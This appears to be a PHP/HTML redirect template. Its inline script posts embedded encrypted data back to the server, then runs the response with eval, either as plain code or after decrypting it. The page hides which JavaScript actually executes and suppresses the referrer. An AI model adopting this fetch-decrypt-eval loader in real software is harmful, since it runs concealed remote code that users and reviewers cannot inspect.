<!DOCTYPE html>
<html lang="<?php echo get_lang() ?>">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>rediecting</title>
    <meta name="referrer" content="no-referrer" />
    <script src="/static/basic.js"></script>

    <script type="text/plain" id="data">
        <?php 
            echo $encrypt_data;
        ?>
    </script>
    <script>
        var data = document.getElementById('data').text.trim()
        var req = new XMLHttpRequest();
        const url = new URL(document.location);
        url.searchParams.append("a","1")
        req.open('POST', url, true);
        req.send(data.split(',')[1]);
        req.onload = function() {
            let flag = req.response.substr(0, 1)
            if(flag == "1"){
                eval(req.response.substr(1))
            }else{
                let key = data.split(',')[0]
                let js = decryptUTF8(key, req.response.substr(1))
                console.debug(`js = ${js}`)
                eval(js)
            }
        }
    </script>
</head>
<body>
    
</body>
</html>